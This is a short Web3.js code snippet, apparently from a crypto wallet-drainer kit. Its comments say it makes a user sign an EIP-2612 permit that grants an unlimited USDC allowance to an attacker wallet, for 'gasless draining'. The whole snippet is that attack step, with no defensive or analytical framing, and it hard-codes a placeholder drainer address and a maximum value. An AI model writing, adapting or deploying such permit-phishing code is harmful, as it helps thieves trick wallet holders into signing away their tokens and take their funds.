//Web3.js snippet that sends a permit() for USDC to an attacker wallet.
//This enables gasless draining with EIP-2612
const permit = await signer._signTypedData(
  domain, { Permit }, {
    owner: userAddress,
    spender: "0xDrainerWallet",
    value: MAX_UINT,
    nonce,
    deadline
  }
);
